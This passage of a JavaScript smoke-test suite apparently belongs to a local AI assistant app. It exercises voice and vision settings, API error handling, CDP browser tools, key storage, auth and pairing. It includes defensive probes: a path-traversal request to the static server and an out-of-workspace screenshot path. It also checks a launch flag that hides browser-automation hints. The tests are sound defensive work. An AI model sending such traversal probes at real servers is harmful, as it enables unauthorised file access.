    check('voice: transcription comes back, tags stripped', tr.ok && trJson.text === '帮我看看磁盘', JSON.stringify(trJson));
    const call = seen.at(-1);
    check('voice: multipart to /audio/transcriptions with file + model', call?.url === '/v1/audio/transcriptions' && call.type.includes('multipart/form-data') && call.body.includes('name="model"\r\n\r\nstt-1') && call.body.includes('filename="voice.webm"') && call.body.includes('fake-opus-bytes'));
    await api('/api/voice', { method: 'PUT', body: { apiKey: 'wrong' } });
    const denied = await fetch(`${base}/api/voice/transcribe`, { method: 'POST', headers: { 'content-type': 'audio/webm' }, body: Buffer.from('x') });
    const deniedJson = await denied.json();
    check('voice: a rejected key is reported, not swallowed', denied.status === 502 && /Key/.test(deniedJson.error?.message || ''));
    const empty = await fetch(`${base}/api/voice/transcribe`, { method: 'POST', headers: { 'content-type': 'audio/webm' } });
    check('voice: empty recording is rejected', empty.status === 400);
    // Vision: who pays, what is sent, and the settings round trip.
    const vis = await import('../src/vision.mjs');
    const own = vis.resolveVision({ apiKey: 'v-own', baseUrl: '', model: '' }, {});
    const viaVoice = vis.resolveVision({}, { voice: { apiKey: 'sf-key', baseUrl: '' } });
    const viaChat = vis.resolveVision({}, { settings: { provider: 'openai', baseUrl: 'https://api.openai.com/v1' }, chatKey: 'c-key' });
    const none = vis.resolveVision({}, { settings: { provider: 'deepseek' }, chatKey: 'd-key', voice: { apiKey: 'x', baseUrl: 'https://api.openai.com/v1' } });
    check('vision: own key wins, SiliconFlow voice key next, then a vision-capable chat provider',
      own?.source === 'own' && own.model === 'Qwen/Qwen3-VL-32B-Instruct'
      && viaVoice?.source === 'voice' && viaVoice.apiKey === 'sf-key' && /siliconflow/.test(viaVoice.baseUrl)
      && viaChat?.source === 'model' && viaChat.model === 'gpt-4o-mini' && none === null);
    let sent = null;
    const fakeFetch = async (url, opts) => { sent = { url, body: JSON.parse(opts.body), auth: opts.headers.authorization }; return new Response(JSON.stringify({ choices: [{ message: { content: '一只猫' } }] }), { status: 200 }); };
    const looked = await vis.describeImage(own, Buffer.from('png-bytes'), 'image/png', '这是什么？', { fetchImpl: fakeFetch });
    const parts = sent?.body?.messages?.[0]?.content || [];
    check('vision: image goes as a data URL with the question, answer comes back', looked.text === '一只猫' && sent.url.endsWith('/chat/completions') && sent.auth === 'Bearer v-own' && parts[0]?.image_url?.url?.startsWith('data:image/png;base64,') && parts[1]?.text === '这是什么？');
    let visErr = null;
    try { await vis.describeImage(own, Buffer.from('x'), 'image/png', '', { fetchImpl: async () => new Response('{"error":{"message":"bad key"}}', { status: 401 }) }); } catch (err) { visErr = err; }
    check('vision: a rejected key is reported in plain words', visErr?.code === 'VISION_FAILED' && /密钥无效/.test(visErr.message));
    const vGet = await api('/api/vision');
    const vPut = await api('/api/vision', { method: 'PUT', body: { baseUrl: 'https://example.test/v1', model: 'vl-1', apiKey: 'vision-secret' } });
    check('vision settings: saved, available, key never returned', vGet.status === 200 && vPut.status === 200 && vPut.json.available && vPut.json.source === 'own' && vPut.json.model === 'vl-1' && !JSON.stringify(vPut.json).includes('vision-secret'));
    await api('/api/vision', { method: 'PUT', body: { apiKey: '' } });
    const cleared = await api('/api/voice', { method: 'PUT', body: { apiKey: '' } });
    check('voice: clearing the key turns it off again', cleared.status === 200 && cleared.json.available === false);
  } finally {
    stt.close();
  }
}

async function scenarioErrors() {
  const missing = await api('/api/nope');
  check('unknown route returns 404 JSON error shape', missing.status === 404 && missing.json?.error?.code === 'NOT_FOUND');

  const badBot = await api('/api/bots/ghost/message', { method: 'POST', body: { text: 'hi' } });
  check('unknown bot returns 404 with an error code', badBot.status === 404 && badBot.json?.error?.code === 'BOT_NOT_FOUND');

  const empty = await api('/api/bots/chief/message', { method: 'POST', body: { text: '   ' } });
  check('empty message is rejected with 400', empty.status === 400 && empty.json?.error?.code === 'EMPTY_MESSAGE');

  const badJson = await fetch(`${base}/api/bots`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: '{ this is not json',
  });
  const badJsonBody = await badJson.json().catch(() => null);
  check('malformed JSON body is rejected with 400', badJson.status === 400 && badJsonBody?.error?.code === 'BAD_JSON', String(badJson.status));

  const traversal = await fetch(`${base}/%2e%2e/package.json`);
  check('static server refuses path traversal', traversal.status === 403 || traversal.status === 404, `status ${traversal.status}`);
}

// ---------------------------------------------------------------------------
// settings, auth, pairing, streaming, crash recovery
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// browser automation: a real Chromium driven over CDP against a local page
// ---------------------------------------------------------------------------

/**
 * Everything here talks to a live browser. The page under test is served from
 * this process on loopback, so the run never depends on the network.
 *
 * If the machine genuinely has no Chromium installed, the live assertions are
 * skipped (and the graceful not_configured path is still proven) rather than
 * failing a smoke run on a box that simply cannot do browser automation.
 */
async function scenarioBrowser({ toolsMod, browserMod, home }) {
  const PAYLOAD = 'assist-download-payload-0123456789\n';
  const PAGE = [
    '<!doctype html><html><head><title>Assist Browser Test</title>',
    '<style>body{font-family:sans-serif}.hidden{display:none}</style></head><body>',
    '<h1>Browser test page</h1>',
    '<p id="intro">This page exists so the assistant can prove it really clicked.</p>',
    '<button id="go">Click me</button>',
    '<p id="out">not clicked</p>',
    '<input id="name" placeholder="Your name" />',
    '<button id="hidden-btn" class="hidden">invisible</button>',
    '<a id="dl" href="/report.txt">Download report</a>',
    '<script>document.getElementById("go").addEventListener("click", function () {',
    '  document.getElementById("out").textContent = "clicked!";',
    '});</script>',
    '<script>window.__secret_marker__ = "do-not-leak";</script>',
    '</body></html>',
  ].join('\n');

  const testServer = http.createServer((req, res) => {
    const url = new URL(req.url, 'http://127.0.0.1');
    if (url.pathname === '/report.txt') {
      res.writeHead(200, {
        'content-type': 'text/plain',
        'content-disposition': 'attachment; filename="report.txt"',
        'content-length': Buffer.byteLength(PAYLOAD),
      });
      res.end(PAYLOAD);
      return;
    }
    if (url.pathname === '/other') {
      res.writeHead(200, { 'content-type': 'text/html' });
      res.end('<!doctype html><html><head><title>Other page</title></head><body><h1>other</h1><button id="b2">two</button></body></html>');
      return;
    }
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end(PAGE);
  });
  await new Promise((resolve) => testServer.listen(0, '127.0.0.1', resolve));
  const origin = `http://127.0.0.1:${testServer.address().port}`;

  const workspaceDir = path.join(home, 'workspace');
  const registry = toolsMod.createRegistry({
    workspaceDir,
    config: { policy: {} },
    getRuntime: () => {
      throw new Error('agent runtime is not needed for the browser stage');
    },
    getRoutines: () => {
      throw new Error('routines are not needed for the browser stage');
    },
  });
  const ctx = { workspaceDir, bot: { id: 'researcher' }, turnId: 'smoke-browser' };
  const call = (name, args = {}) => registry.get(name).run(args, ctx);

  const saved = {
    chromePath: process.env.CHROME_PATH,
    headless: process.env.BROWSER_HEADLESS,
    allowPrivate: process.env.ALLOW_PRIVATE,
  };

  // Headless so the smoke run does not throw windows over the user's desktop;
  // windowed is the product default and is asserted separately below.
  process.env.BROWSER_HEADLESS = '1';
  process.env.ALLOW_PRIVATE = '1'; // the test page is on loopback
  delete process.env.CHROME_PATH; // exercise real auto-detection

  try {
    // --- registration + launch flags (no browser needed) ------------------
    const browserTools = registry.all().filter((t) => t.name.startsWith('browser_')).map((t) => t.name);
    check(
      'browser: all nine browser tools are registered',
      ['browser_open', 'browser_snapshot', 'browser_click', 'browser_type', 'browser_screenshot',
        'browser_download', 'browser_eval', 'browser_close', 'browser_status'].every((n) => browserTools.includes(n)),
      browserTools.join(','),
    );

    const risks = Object.fromEntries(
      registry.all().filter((t) => t.name.startsWith('browser_')).map((t) => [t.name, t.risk]),
    );
    check(
      'browser: risk levels match the spec (LOW/MEDIUM/HIGH)',
      risks.browser_open === 'LOW' && risks.browser_snapshot === 'LOW' && risks.browser_click === 'MEDIUM' &&
        risks.browser_type === 'MEDIUM' && risks.browser_screenshot === 'LOW' && risks.browser_download === 'MEDIUM' &&
        risks.browser_eval === 'HIGH' && risks.browser_close === 'LOW' && risks.browser_status === 'LOW',
      JSON.stringify(risks),
    );

    check(
      'browser: granting browser_open grants the browser family',
      registry.isGranted({ tools: ['browser_open'] }, 'browser_click') === true &&
        registry.isGranted({ tools: ['fs_read'] }, 'browser_click') === false,
    );

    const windowedArgs = browserMod.buildLaunchArgs({ port: 1, profileDir: 'profile', headless: false });
    const headlessArgs = browserMod.buildLaunchArgs({ port: 1, profileDir: 'profile', headless: true });
    check('browser: windowed by default (no --headless flag)', !windowedArgs.some((a) => a.startsWith('--headless')));
    check('browser: BROWSER_HEADLESS=1 adds --headless=new', headlessArgs.includes('--headless=new'));
    check(
      'browser: launch args keep the profile and disable automation hints',
      headlessArgs.includes('--user-data-dir=profile') &&
        headlessArgs.includes('--no-first-run') &&
        headlessArgs.includes('--disable-blink-features=AutomationControlled'),
    );
    check(
      'browser: the profile lives under <data>/browser-profile',
      browserMod.profileDir().split(path.sep).join('/').endsWith('/data/browser-profile'),
      browserMod.profileDir(),
    );
    check(
      'browser: the private-host guard knows LAN vs public hosts',
      browserMod.isPrivateHostname('http://192.168.1.5/') === true &&
        browserMod.isPrivateHostname('http://localhost:3000/') === true &&
        browserMod.isPrivateHostname('https://example.com/') === false,
    );

    const detection = browserMod.detectBrowserExecutable();
    const support = browserMod.browserSupport();
    check('browser: Node has a global WebSocket for CDP', support.supported === true, support.reason || '');

    if (!detection.path) {
      skip('browser live automation', 'no Chromium-based browser is installed on this machine');
      const missing = await call('browser_open', { url: 'https://example.com' });
      check(
        'browser_open: no installed browser returns a structured not_configured',
        missing.ok === false && missing.error?.code === 'not_configured',
        JSON.stringify(missing).slice(0, 160),
      );
      return;
    }

    check(
      'browser: auto-detects the installed Chromium (CHROME_PATH unset)',
      detection.source === 'auto-detect' && /chrome\.exe$|msedge\.exe$|chrome$|chromium|msedge$/i.test(detection.path),
      `${detection.source}: ${detection.path}`,
    );

    const before = await call('browser_status');
    check('browser_status: not running before the first call', before.ok === true && before.running === false);
    check('browser_status: reports the detected executable and profile', Boolean(before.executable) && before.profileDir.includes('browser-profile'));

    // --- open --------------------------------------------------------------
    const opened = await call('browser_open', { url: `${origin}/` });
    check('browser_open: returns the page title', opened.ok === true && opened.title === 'Assist Browser Test', JSON.stringify(opened).slice(0, 200));
    check('browser_open: returns the final url', opened.ok === true && String(opened.url).startsWith(origin));
    check(
      'browser_open: reports the live browser (pid, profile, headless flag)',
      Number.isInteger(opened.browser?.pid) && opened.browser.pid > 0 && opened.browser.headless === true,
      JSON.stringify(opened.browser || {}).slice(0, 160),
    );

    // --- snapshot ------------------------------------------------------------
    const snap = await call('browser_snapshot');
    check('browser_snapshot: returns visible text and elements', snap.ok === true && snap.text.length > 0 && Array.isArray(snap.elements));
    check('browser_snapshot: strips <script> content from the text', !snap.text.includes('do-not-leak'), 'script leaked into the page text');
    check('browser_snapshot: keeps human-visible copy', snap.text.includes('Browser test page'));

    const buttonEl = snap.elements.find((e) => e.tag === 'button' && e.name === 'Click me');
    const inputEl = snap.elements.find((e) => e.tag === 'input');
    const linkEl = snap.elements.find((e) => e.tag === 'a');
    check('browser_snapshot: interactive elements carry a stable ref', /^@e\d+$/.test(buttonEl?.ref || ''), buttonEl?.ref);
    check('browser_snapshot: the input is described as a textbox', inputEl?.role === 'textbox', inputEl?.role);
    check('browser_snapshot: the link is described as a link', linkEl?.role === 'link' && linkEl?.visible === true);
    check('browser_snapshot: hidden elements are not listed', !snap.elements.some((e) => e.name === 'invisible'));

    // --- click ---------------------------------------------------------------
    const clicked = await call('browser_click', { ref: buttonEl.ref });
    check('browser_click: clicks an element by snapshot ref', clicked.ok === true, JSON.stringify(clicked).slice(0, 200));
    const afterClick = await call('browser_eval', { expression: 'document.getElementById("out").textContent' });
    check('browser_click: the page really changed', afterClick.ok === true && afterClick.value === 'clicked!', JSON.stringify(afterClick).slice(0, 160));

    // --- type -----------------------------------------------------------------
    const typed = await call('browser_type', { ref: inputEl.ref, text: 'Ada Lovelace' });
    check('browser_type: types into the field', typed.ok === true && typed.value === 'Ada Lovelace', JSON.stringify(typed).slice(0, 200));
    const readBack = await call('browser_eval', { expression: 'document.getElementById("name").value' });
    check('browser_type: the DOM holds the typed value', readBack.ok === true && readBack.value === 'Ada Lovelace');

    const typedBySelector = await call('browser_type', { selector: '#name', text: 'Grace Hopper' });
    check('browser_type: accepts a CSS selector too', typedBySelector.ok === true && typedBySelector.value === 'Grace Hopper', JSON.stringify(typedBySelector).slice(0, 160));

    // --- screenshot -------------------------------------------------------------
    const shot = await call('browser_screenshot');
    check('browser_screenshot: writes to workspace/artifacts', shot.ok === true && /^artifacts\/.+\.png$/.test(shot.path || ''), shot.path);
    const png = shot.ok ? await fsp.readFile(shot.absolutePath).catch(() => null) : null;
    check(
      'browser_screenshot: the file is a real PNG (magic bytes)',
      Boolean(png) && png.length > 1000 && png.subarray(0, 8).toString('hex') === '89504e470d0a1a0a',
      png ? `${png.length} bytes` : 'no file',
    );
    const escape = await call('browser_screenshot', { path: '../escape.png' });
    check(
      'browser_screenshot: refuses a path outside the workspace',
      escape.ok === false && escape.error?.code === 'SCREENSHOT_PATH_OUTSIDE',
      JSON.stringify(escape).slice(0, 160),
    );

    // --- download ---------------------------------------------------------------
    const download = await call('browser_download', { url: `${origin}/report.txt` });
    check('browser_download: saves the file through the browser', download.ok === true && download.bytes === Buffer.byteLength(PAYLOAD), JSON.stringify(download).slice(0, 200));
    const downloadedBytes = download.ok ? await fsp.readFile(download.absolutePath).catch(() => null) : null;
    check('browser_download: bytes on disk match the served payload', downloadedBytes?.toString('utf8') === PAYLOAD);
    check('browser_download: reports a workspace-relative path', typeof download.path === 'string' && download.path.startsWith('downloads/'));

    const named = await call('browser_download', { url: `${origin}/report.txt`, path: 'downloads/my-report.txt' });
    check(
      'browser_download: honours an explicit destination path',
      named.ok === true && named.path === 'downloads/my-report.txt' && named.bytes === Buffer.byteLength(PAYLOAD),
      JSON.stringify(named).slice(0, 200),
    );

    // --- stale refs ---------------------------------------------------------------
    const navigated = await call('browser_open', { url: `${origin}/other` });
    check('browser_open: can navigate to a second page', navigated.ok === true && navigated.title === 'Other page');
    const stale = await call('browser_click', { ref: buttonEl.ref });
    check(
      'browser_click: a ref from a previous page fails gracefully with STALE_REF',
      stale.ok === false && stale.error?.code === 'STALE_REF',
      JSON.stringify(stale).slice(0, 200),
    );

    // --- status + close --------------------------------------------------------------
    const running = await call('browser_status');
    check(
      'browser_status: reports running with a pid and a cdp url',
      running.running === true && running.pid > 0 && /^http:\/\/127\.0\.0\.1:\d+$/.test(running.cdpUrl || ''),
      JSON.stringify(running).slice(0, 200),
    );
    const closed = await call('browser_close');
    check('browser_close: stops the browser process', closed.ok === true && closed.closed === true);
    const afterClose = await call('browser_status');
    check('browser_status: not running after close', afterClose.running === false);

    // --- runtime without a native WebSocket ---------------------------------------------
    // Node >= 22 ships one; Electron's bundled Node 20 does not. The in-repo
    // RFC 6455 client must keep the browser working there, so deleting the
    // global has to be a no-op for the tools, not an error.
    const realWebSocket = globalThis.WebSocket;
    globalThis.WebSocket = undefined;
    let shimResult;
    try {
      shimResult = await call('browser_open', { url: 'https://example.com' });
    } finally {
      globalThis.WebSocket = realWebSocket;
    }
    check(
      'browser: works without a native WebSocket (RFC 6455 shim)',
      shimResult.ok === true && typeof shimResult.title === 'string',
      JSON.stringify(shimResult).slice(0, 200),
    );
  } finally {
    // Never leave a browser behind, even if an assertion above threw.
    await registry.get('browser_close').run({}, ctx).catch(() => {});
    testServer.close();
    if (saved.chromePath === undefined) delete process.env.CHROME_PATH;
    else process.env.CHROME_PATH = saved.chromePath;
    if (saved.headless === undefined) delete process.env.BROWSER_HEADLESS;
    else process.env.BROWSER_HEADLESS = saved.headless;
    if (saved.allowPrivate === undefined) delete process.env.ALLOW_PRIVATE;
    else process.env.ALLOW_PRIVATE = saved.allowPrivate;
  }
}

async function scenarioSettings({ settingsMod }) {
  const initial = await api('/api/settings');
  check('GET /api/settings returns 200', initial.status === 200, initial.text.slice(0, 200));
  const settings = initial.json || {};
  check('settings expose the app name and version', Boolean(settings.app?.name) && Boolean(settings.app?.version), JSON.stringify(settings.app));
  check(
    'settings start in mock mode with no key',
    settings.model?.provider === 'mock' && settings.model?.hasKey === false,
    JSON.stringify(settings.model),
  );
  check(
    'settings expose an OpenAI-compatible endpoint and model name',
    typeof settings.model?.baseUrl === 'string' && settings.model.baseUrl.startsWith('http') && typeof settings.model?.model === 'string',
  );
  check(
    'settings expose server + pairing details',
    typeof settings.server?.host === 'string' &&
      typeof settings.server?.port === 'number' &&
      typeof settings.server?.requireAuth === 'boolean' &&
      Boolean(settings.pairing?.url) &&
      Boolean(settings.pairing?.code),
    JSON.stringify({ server: settings.server, pairing: settings.pairing }),
  );
  check('settings never contain key material', !initial.text.includes('sk-') && !initial.text.includes('apiKey'));

  const secret = 'sk-smoke-DO-NOT-LEAK-42';
  const put = await api('/api/settings', {
    method: 'PUT',
    body: { provider: 'openai', baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini', apiKey: secret },
  });
  check('PUT /api/settings accepts a provider and a key', put.status === 200 && put.json?.ok === true, put.text.slice(0, 200));
  check(
    'PUT reports hasKey but never echoes the key',
    put.json?.model?.hasKey === true && !put.text.includes(secret) && !put.text.includes('sk-'),
    put.text.slice(0, 200),
  );

  const after = await api('/api/settings');
  check('GET /api/settings now reports hasKey', after.json?.model?.hasKey === true);
  check('the API key never crosses the API', !after.text.includes(secret) && !after.text.includes('sk-'));
  check(
    'provider, baseUrl and model are persisted as given',
    after.json?.model?.provider === 'openai' &&
      after.json?.model?.baseUrl === 'https://api.openai.com/v1' &&
      after.json?.model?.model === 'gpt-4o-mini',
    JSON.stringify(after.json?.model),
  );

  const rawSettings = await fsp.readFile(path.join(home, 'config', 'settings.json'), 'utf8').catch(() => '');
  const rawSecrets = await fsp.readFile(path.join(home, 'data', 'secrets.json'), 'utf8').catch(() => '');
  check('config/settings.json holds provider/baseUrl/model', /"provider": "openai"/.test(rawSettings) && /"model": "gpt-4o-mini"/.test(rawSettings), rawSettings.slice(0, 160));
  check('the key is not in config/settings.json', !rawSettings.includes(secret));
  check('the key lives only in data/secrets.json', rawSecrets.includes(secret));

  const cleared = await api('/api/settings', {
    method: 'PUT',
    body: { provider: 'openai', baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini', apiKey: '' },
  });
  check('an empty apiKey clears the stored key', cleared.status === 200 && cleared.json?.model?.hasKey === false, cleared.text.slice(0, 200));
  const secretsAfter = await fsp.readFile(path.join(home, 'data', 'secrets.json'), 'utf8').catch(() => '');
  check('clearing the key removes it from disk', !secretsAfter.includes(secret));

  const badProvider = await api('/api/settings', { method: 'PUT', body: { provider: 'not-a-provider' } });
  check('an unknown provider is rejected with 400', badProvider.status === 400 && badProvider.json?.error?.code === 'INVALID_PROVIDER', badProvider.text.slice(0, 200));
  const badUrl = await api('/api/settings', { method: 'PUT', body: { baseUrl: 'ftp://example.com' } });
  check('a non-http baseUrl is rejected with 400', badUrl.status === 400 && badUrl.json?.error?.code === 'INVALID_BASE_URL', badUrl.text.slice(0, 200));

  const mockTest = await api('/api/settings/test', { method: 'POST', body: {} });
  check(
    'POST /api/settings/test reports mock mode without a network call',
    mockTest.status === 200 && mockTest.json?.ok === true && mockTest.json?.mode === 'mock' && typeof mockTest.json?.latencyMs === 'number',
    mockTest.text.slice(0, 200),
  );

  // The shipped UI tries { model: {...} } first and falls back to the flat body;
  // both shapes have to mean exactly the same thing.
  const nested = await api('/api/settings', {
    method: 'PUT',
    body: { model: { provider: 'mock', baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini', apiKey: 'sk-nested-DO-NOT-LEAK' } },
  });
  check(
    'PUT /api/settings also accepts the nested {model:{...}} shape',
    nested.status === 200 && nested.json?.model?.hasKey === true && !nested.text.includes('sk-nested'),
    nested.text.slice(0, 200),
  );
  const nestedClear = await api('/api/settings', { method: 'PUT', body: { model: { apiKey: '' } } });
  check('a nested apiKey:"" clears the key too', nestedClear.status === 200 && nestedClear.json?.model?.hasKey === false, nestedClear.text.slice(0, 200));
  const emptyBody = await api('/api/settings', { method: 'PUT', body: {} });
  check('an empty settings body is rejected instead of silently doing nothing', emptyBody.status === 400 && emptyBody.json?.error?.code === 'SETTINGS_EMPTY', emptyBody.text.slice(0, 160));
  const nestedTest = await api('/api/settings/test', {
    method: 'POST',
    body: { model: { provider: 'mock', baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini' } },
  });
  check('POST /api/settings/test accepts a nested unsaved override', nestedTest.status === 200 && nestedTest.json?.mode === 'mock', nestedTest.text.slice(0, 160));

  // Leave the installation on the offline provider for the rest of the run.
  const restored = await api('/api/settings', {
    method: 'PUT',
    body: { provider: 'mock', baseUrl: 'https://api.openai.com/v1', model: 'gpt-4o-mini' },
  });
  check('settings can be switched back to mock without a restart', restored.status === 200 && restored.json?.model?.provider === 'mock', restored.text.slice(0, 200));

  check('settings: a real provider without a key falls back to mock', settingsMod.effectiveProvider({ provider: 'openai' }, '') === 'mock');
  check('settings: a real provider with a key is live', settingsMod.effectiveProvider({ provider: 'openai' }, 'sk-test') === 'openai');
  check('settings: hasKey is false for an empty string', settingsMod.hasKey('') === false && settingsMod.hasKey('sk-x') === true);
}

function scenarioAuth({ auth }) {
  const security = { token: 'a'.repeat(24), code: 'c0ffee00' };

  const local = auth.evaluateAuth({ socket: { remoteAddress: '127.0.0.1' }, headers: {} }, security);
  check('auth: loopback is authorized as local', local.authorized === true && local.mode === 'local' && local.required === false, JSON.stringify(local));

  const localV6 = auth.evaluateAuth({ socket: { remoteAddress: '::1' }, headers: {} }, security);
  check('auth: IPv6 loopback is local', localV6.authorized === true && localV6.mode === 'local');

  const mapped = auth.evaluateAuth({ socket: { remoteAddress: '::ffff:127.0.0.1' }, headers: {} }, security);
  check('auth: IPv4-mapped loopback is local', mapped.authorized === true && mapped.mode === 'local');

  const remote = auth.evaluateAuth({ socket: { remoteAddress: '192.168.1.50' }, headers: {} }, security);
  check('auth: a LAN client without credentials is rejected', remote.authorized === false && remote.required === true && remote.mode === 'none', JSON.stringify(remote));

  const bearer = auth.evaluateAuth({ socket: { remoteAddress: '192.168.1.50' }, headers: { authorization: `Bearer ${security.token}` } }, security);
  check('auth: a LAN client with the bearer token is authorized', bearer.authorized === true && bearer.mode === 'token', JSON.stringify(bearer));

  const wrongBearer = auth.evaluateAuth({ socket: { remoteAddress: '192.168.1.50' }, headers: { authorization: 'Bearer nope' } }, security);
  check('auth: a wrong bearer token is rejected', wrongBearer.authorized === false);

  const cookie = auth.evaluateAuth({ socket: { remoteAddress: '192.168.1.50' }, headers: { cookie: `theme=dark; desk_session=${security.token}` } }, security);
  check('auth: a paired cookie is authorized', cookie.authorized === true && cookie.mode === 'cookie', JSON.stringify(cookie));

  const wrongCookie = auth.evaluateAuth({ socket: { remoteAddress: '192.168.1.50' }, headers: { cookie: 'desk_session=wrong' } }, security);
  check('auth: a wrong cookie is rejected', wrongCookie.authorized === false);

  check(
    'auth: the app shell is reachable without a credential',
    ['/', '/index.html', '/manifest.json', '/sw.js', '/offline.html', '/icons/icon-192.png'].every((p) => auth.isPublicShellPath(p)),
  );
  check('auth: API paths are not public shell paths', auth.isPublicShellPath('/api/settings') === false && auth.isPublicShellPath('/api/bots') === false);
  check('auth: /api/auth and /api/pair are exempt from the gate', auth.isAuthExemptPath('GET', '/api/auth') && auth.isAuthExemptPath('POST', '/api/pair'));
  check('auth: every other API endpoint is gated', auth.isAuthExemptPath('GET', '/api/settings') === false && auth.isAuthExemptPath('POST', '/api/bots') === false);

  const cookieHeader = auth.sessionCookieHeader('abc123');
  check(
    'auth: the session cookie is HttpOnly, SameSite=Lax, Path=/ and long-lived',
    /^desk_session=abc123/.test(cookieHeader) && /HttpOnly/.test(cookieHeader) && /SameSite=Lax/.test(cookieHeader) && /Path=\//.test(cookieHeader) && /Max-Age=31536000/.test(cookieHeader),
    cookieHeader,
  );

  const limiter = auth.createRateLimiter({ limit: 3, windowMs: 1000 });
  check('auth: the rate limiter allows the first attempts', limiter.check('ip').allowed && limiter.check('ip').allowed && limiter.check('ip').allowed);
  check('auth: the rate limiter blocks after the limit', limiter.check('ip').allowed === false);
  check('auth: the rate limiter is per client', limiter.check('other-ip').allowed === true);
}

async function scenarioPairing() {
  const pairing = await api('/api/pairing');
  check('GET /api/pairing returns a url and a code for the local user', pairing.status === 200 && Boolean(pairing.json?.url) && Boolean(pairing.json?.code), pairing.text.slice(0, 200));
  const code = pairing.json.code;
  check('the pairing code is short and random-looking', /^\d{8}$/.test(code), code);

  const wrong = await api('/api/pair', { method: 'POST', body: { code: '00000000' } });
  check('a wrong pairing code is rejected', wrong.status === 401 && wrong.json?.error?.code === 'PAIR_INVALID_CODE', wrong.text.slice(0, 200));

  const ok = await api('/api/pair', { method: 'POST', body: { code } });
  const setCookie = ok.headers.get('set-cookie') || '';
  check('the right pairing code pairs the client', ok.status === 200 && ok.json?.ok === true, ok.text.slice(0, 200));
  check(
    'pairing sets an HttpOnly SameSite=Lax session cookie',
    /desk_session=/.test(setCookie) && /HttpOnly/i.test(setCookie) && /SameSite=Lax/i.test(setCookie) && /Path=\//.test(setCookie) && /Max-Age=31536000/.test(setCookie),
    setCookie,
  );

  const authInfo = await api('/api/auth');
  check(
    'GET /api/auth reports local mode on loopback',
    authInfo.status === 200 && authInfo.json?.authorized === true && authInfo.json?.mode === 'local' && authInfo.json?.required === false,
    authInfo.text,
  );

  // Wrong attempts already spent two of the five permits; spend the rest.
  for (let i = 0; i < 3; i += 1) await api('/api/pair', { method: 'POST', body: { code: 'ffffffff' } });
  const limited = await api('/api/pair', { method: 'POST', body: { code } });
  check('pairing is rate-limited to 5 attempts per minute', limited.status === 429 && limited.json?.error?.code === 'PAIR_RATE_LIMITED', limited.text.slice(0, 200));
}

async function scenarioMockStreaming() {
  const stream = await openStream('chief');
  let turn;
  try {
    turn = await runTurn('chief', 'Hello, what can you do?', stream);
  } finally {
    stream.close();
  }

  check('a plain chat turn completes', turn.status === 'success', turn.status);
  const deltas = turn.events.filter((e) => e.type === 'message.delta');
  const message = turn.events.find((e) => e.type === 'message' && e.final);
  check('the mock provider emits several deltas', deltas.length >= 2, `${deltas.length}`);
  check(
    'mock deltas concatenate to the final message',
    Boolean(message) && deltas.map((d) => d.text).join('') === message.text,
    JSON.stringify(message?.text || '').slice(0, 80),
  );
  check(
    'delta offsets are increasing character indexes',
    deltas.every((d, i) => (i === 0 ? d.index === 0 : d.index === deltas[i - 1].index + deltas[i - 1].text.length)),
    deltas.map((d) => d.index).join(','),
  );
  const firstDelta = turn.events.findIndex((e) => e.type === 'message.delta');
  const finalIndex = turn.events.findIndex((e) => e.type === 'message' && e.final);
  check('deltas arrive before the final message event', firstDelta >= 0 && finalIndex > firstDelta, `${firstDelta} vs ${finalIndex}`);
}

/**
 * A fake OpenAI-compatible endpoint, in-process, on 127.0.0.1. It speaks real
 * SSE (frames deliberately split across TCP writes) and a plain JSON response
 * for the non-streaming settings test. No network access, no API key.
 */
async function startFakeProvider() {
  const http = await import('node:http');
  const seen = [];

  const server = http.createServer(async (req, res) => {
    let raw = '';
    for await (const chunk of req) raw += chunk;
    let body = {};
    try {
      body = JSON.parse(raw || '{}');
    } catch {
      body = {};
    }
    seen.push(body);
    const hasToolResult = Array.isArray(body.messages) && body.messages.some((m) => m.role === 'tool');

    if (body.stream === true) {
      res.writeHead(200, { 'content-type': 'text/event-stream; charset=utf-8', 'cache-control': 'no-cache' });
      res.write(': fake provider\n\n');
      const send = (payload) => res.write(`data: ${JSON.stringify(payload)}\n\n`);
      send({ choices: [{ index: 0, delta: { role: 'assistant' } }] });

      if (!hasToolResult) {
        // A thinking model emits its reasoning first. It must not reach the UI
        // as text, and it must be echoed back on the following request.
        send({ choices: [{ index: 0, delta: { reasoning_content: 'I should list the workspace.' } }] });
        // "think-then-call" asks for the shape that used to break the agent: one
        // reply that carries BOTH text and a tool call. Splitting that into two
        // assistant messages is what DeepSeek's thinking mode rejects with a 400.
        const lastUser = [...(body.messages || [])].reverse().find((m) => m.role === 'user');
        if (String(lastUser?.content || '').includes('think-then-call')) {
          send({ choices: [{ index: 0, delta: { content: 'Let me look. ' } }] });
        }
        // A tool call whose arguments arrive as fragments, plus an id/name frame.
        send({
          choices: [
            {
              index: 0,
              delta: {
                tool_calls: [{ index: 0, id: 'call_fake_1', type: 'function', function: { name: 'fs_list', arguments: '' } }],
              },
            },
          ],
        });
        for (const part of ['{"pa', 'th":', ' ".', '"}']) {
          await sleep(2);
          send({ choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { arguments: part } }] } }] });
        }
        send({ choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] });
        res.write('data: [DONE]\n\n');
        res.end();
        return;
      }

      // Content, with the first frame split in half across two writes.
      const pieces = ['All ', 'done: ', 'three ', 'files.'];
      for (const [index, piece] of pieces.entries()) {
        const frame = `data: ${JSON.stringify({ choices: [{ index: 0, delta: { content: piece } }] })}\n\n`;
        if (index === 0) {
          const cut = Math.floor(frame.length / 2);
          res.write(frame.slice(0, cut));
          await sleep(5);
          res.write(frame.slice(cut));
        } else {
          res.write(frame);
        }
        await sleep(2);
      }
      send({ choices: [{ index: 0, delta: {}, finish_reason: 'stop' }], usage: { prompt_tokens: 3, completion_tokens: 5 } });
      res.write('data: [DONE]\n\n');
      res.end();
      return;
    }

    // Non-streaming (the settings connection test).
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ choices: [{ index: 0, message: { role: 'assistant', content: 'OK' }, finish_reason: 'stop' }], usage: { total_tokens: 1 } }));
  });

  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const { port } = server.address();
  return {
